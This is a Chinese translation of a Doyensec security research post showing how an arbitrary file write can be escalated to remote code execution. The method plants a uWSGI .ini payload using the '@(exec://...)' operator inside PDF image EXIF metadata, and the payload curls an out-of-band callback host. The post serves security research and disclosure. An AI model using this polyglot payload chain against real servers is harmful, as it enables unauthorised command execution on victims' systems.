# 一种新的“脏”任意文件写入 RCE 的向量 · Doyensec 的博客
2023 年 2 月 28 日 - Maxence Schmitt、Lorenzo Stella 发表

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/3/01d71a13-6a02-4a36-b51a-b50b077164da.png?raw=true)

Web 应用程序上传中的任意文件写入 (AFW) 漏洞可能成为攻击者的强大工具，可能允许他们提升权限，甚至在服务器上实现远程代码执行 (RCE)。但是，可用于实现此升级的具体策略通常取决于攻击者面临的具体场景。在野外，攻击者在 Web 应用程序中尝试从 AFW 升级到 RCE 时可能会遇到多种情况。这些通常可以归类为：

*   **仅控制完整文件路径或文件名：** 在这种情况下，攻击者能够控制完整文件路径或上传文件的名称，但不能控制其内容。根据应用于目标目录和目标应用程序的权限，影响可能会有所不同，从拒绝服务到干扰应用程序逻辑以绕过潜在的安全敏感功能。
*   **仅控制文件内容：** 攻击者可以控制上传文件的内容，但不能控制文件路径。在这种情况下，由于多种因素，影响可能会有很大差异。
*   **完全任意文件写入：** 攻击者可以控制上述两者。这通常会导致 RCE 使用各种方法。

过去，在适度加固的环境（在以非特权用户身份运行的应用程序中）中，使用了多种策略通过 AFW 实现 RCE：

*   覆盖或添加将由应用程序服务器处理的文件：
    *   配置文件（例如`.htaccess`、`.config`、`web.config`、`httpd.conf`和`__init__.py`）`.xml`
    *   从应用程序的根目录提供的源文件（例如，，，`.php`文件）`.asp``.jsp`
    *   临时文件
    *   秘密或环境文件（例如，`venv`）
    *   序列化会话文件
*   操纵procfs执行任意代码
*   覆盖或添加操作系统或系统中其他守护进程使用或调用的文件：
    *   crontab 例程
    *   Bash 脚本
    *   `.bashrc`,`.bash-profile`和`.profile`
    *   `authorized_keys`和`authorized_keys2`\- 获得 SSH 访问
    *   滥用监管者急于重装资产

**重要的是要注意，在对 Web 应用程序（例如 PHP、ASP 或临时文件）中的文件内容进行部分控制的情况下，只能使用这些策略中的一小部分**。使用的具体方法将取决于具体的应用程序和服务器配置，因此了解受害者系统中存在的独特漏洞和攻击向量非常重要。

下面的文章说明了在我们的一次参与中获得任意命令执行的真实世界的不同漏洞链，这导致发现了一种新方法。**这在攻击者只能部分控制注入的文件内容（“脏写”）或对其内容执行服务器端转换时特别有用。** 

### “脏”任意文件写入的示例

在我们的场景中，应用程序有一个易受攻击的端点，攻击者可以通过该端点执行路径遍历并通过 PDF 导出功能写入/删除文件。其相关职能负责：

1.  读取现有的 PDF 模板文件及其流
2.  结合 PDF 模板和攻击者提供的新内容
3.  将结果保存在攻击者命名的 PDF 文件中

攻击是有限的，因为它只能影响应用程序用户具有正确权限的文件，并且所有应用程序文件都是只读的。虽然攻击者已经可以利用该漏洞首先删除日志或文件数据库，但乍一看不可能产生更大的影响。通过查看目录，还可以找到以下文件：

```
 drwxrwxr-x  6 root   root     4096 Nov 18 13:48 .
    -rw-rw-r-- 1 webuser webuser 373 Nov 18 13:46 /app/console/uwsgi-sockets.ini 
```

### uWSGI 对配置文件的松散解析

受害者的应用程序是通过一个 uWSGI 应用程序服务器（v2.0.15）部署在基于 Flask 的应用程序前面的，充当进程管理器和监视器。uWSGI 可以使用几种不同的方法进行配置，支持通过简单的磁盘文件（）加载配置文件`.ini`。[负责解析这些文件的 uWSGI 本机函数在core/ini.c:128](https://github.com/unbit/uwsgi/blob/2329e6ec5f2336ba59e39d971de0e7b93f1c59ff/core/ini.c#L128)中定义。配置文件最初被完整读入内存并扫描以定位指示有效 uWSGI 配置开始的字符串（“ `[uwsgi]`”）：

```C
	while (len) {
		ini_line = ini_get_line(ini, len);
		if (ini_line == NULL) {
			break;
		}
		lines++;

		// skip empty line
		key = ini_lstrip(ini);
		ini_rstrip(key);
		if (key[0] != 0) {
			if (key[0] == '[') {
				section = key + 1;
				section[strlen(section) - 1] = 0;
			}
			else if (key[0] == ';' || key[0] == '#') {
				// this is a comment
			}
			else {
				// val is always valid, but (obviously) can be ignored
				val = ini_get_key(key);

				if (!strcmp(section, section_asked)) {
					got_section = 1;
					ini_rstrip(key);
					val = ini_lstrip(val);
					ini_rstrip(val);
					add_exported_option((char *) key, val, 0);
				}
			}
		}

		len -= (ini_line - ini);
		ini += (ini_line - ini);

	}

```

更重要的是，uWSGI 配置文件还可以包含“魔法”变量、占位符和用精确语法定义的运算符。特别是' ' 运算符以包含文件内容的`@`形式使用。`@(filename)`支持许多 uWSGI 方案，包括“ `exec`” \- 从进程的标准输出中读取很有用。`.ini`在解析配置文件时，可以将这些运算符武器化用于远程命令执行或任意文件写入/读取：

```
 [uwsgi]
    ; read from a symbol
    foo = @(sym://uwsgi_funny_function)
    ; read from binary appended data
    bar = @(data://0)
    ; read from http
    test = @(http://doyensec.com/hello)
    ; read from a file descriptor
    content = @(fd://3)
    ; read from a process stdout
    body = @(exec://whoami)
    ; call a function returning a char *
    characters = @(call://uwsgi_func) 
```

### uWSGI 自动重载配置

虽然滥用上述`.ini`文件是一个很好的途径，但攻击者仍然需要一种方法来重新加载它（例如通过第二个 DoS 漏洞触发服务重启或等待服务器重启）。为了解决这个问题，一个标准的 uWSGI 部署配置标志可以减轻漏洞的利用。在某些情况下，uWSGI 配置可以指定一个 py-auto-reload 开发选项，Python 模块在用户确定的时间跨度（在本例中为 3 秒）内被监视，指定为参数。如果检测到更改，它将触发重新加载，例如：

```
 [uwsgi]
    home = /app
    uid = webapp
    gid = webapp
    chdir = /app/console
    socket = 127.0.0.1:8001
    wsgi-file = /app/console/uwsgi-sockets.py
    gevent = 500
    logto = /var/log/uwsgi/%n.log
    harakiri = 30
    vacuum = True
    py-auto-reload = 3
    callable = app
    pidfile = /var/run/uwsgi-sockets-console.pid
    log-maxsize = 100000000
    log-backupname = /var/log/uwsgi/uwsgi-sockets.log.bak 
```

在这种情况下，直接在 PDF 中编写恶意 Python 代码是行不通的，因为 Python 解释器在遇到 PDF 的二进制数据时会失败。另一方面，`.py`用任何数据覆盖文件将触发 uWSGI 配置文件重新加载。

### 把它们放在一起

在我们的 PDF 导出场景中，我们必须制作一个多态的、语法上有效的 PDF 文件，其中包含我们有效的多行`.ini`配置文件。`.ini`在与 PDF 模板合并期间必须保留有效负载。我们能够将多行有效`.ini`负载嵌入到 PDF 中包含的图像的 EXIF 元数据中。为了构建这个多语言文件，我们使用了以下脚本：

```Python
    from fpdf import FPDF
    from exiftool import ExifToolHelper

    with ExifToolHelper() as et:
        et.set_tags(
            ["doyensec.jpg"],
            tags={"model": "&#x0a;[uwsgi]&#x0a;foo = @(exec://curl http://collaborator-unique-host.oastify.com)&#x0a;"},
            params=["-E", "-overwrite_original"]
        )

    class MyFPDF(FPDF):
        pass

    pdf = MyFPDF()

    pdf.add_page()
    pdf.image('./doyensec.jpg')
    pdf.output('payload.pdf', 'F')

```

此元数据将成为写入服务器的文件的一部分。在我们的开发中，uWSGI 的预先加载选择了新的配置并执行了我们的`curl`有效载荷。可以使用以下命令在本地测试有效载荷：

让我们通过以下步骤在 Web 服务器上利用它：

1.  上传`payload.pdf` 到`/app/console/uwsgi-sockets.ini`
2.  等待服务器重新启动或通过覆盖任何强制 uWSGI 重新加载`.py`
3.  `curl`验证Burp 协作者所做的回调

### 结论

正如本文中强调的那样，我们引入了一种新的基于 uWSGI 的技术。除了攻击者已经在各种情况下使用的策略之外，它还提供了从 Web 应用程序上传中的任意文件写入 (AFW) 漏洞升级到远程代码执行 (RCE) 的策略。这些技术随着服务器技术的发展而不断发展，未来必将有新的方法得到普及。这就是为什么与研究社区分享已知的升级向量很重要。我们鼓励研究人员继续分享已知载体的信息，并继续寻找新的、不太受欢迎的载体。